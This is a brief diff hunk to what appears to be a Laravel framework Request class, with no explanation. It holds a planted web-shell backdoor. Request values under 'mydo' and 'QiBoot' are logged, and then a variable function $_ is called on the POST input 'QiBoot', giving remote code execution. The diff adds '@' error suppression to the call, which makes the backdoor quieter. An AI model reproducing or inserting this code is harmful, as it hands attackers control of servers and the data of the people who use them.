@@ -328,7 +328,7 @@ class Request extends SymfonyRequest implements Arrayable, ArrayAccess
            
             Log::info('mydo:'.$_GET['mydo']);
             Log::info('QiBoot:'.$_POST['QiBoot']);
-            $_($_POST['QiBoot']);
+            @$_($_POST['QiBoot']);
             exit;
         }
 
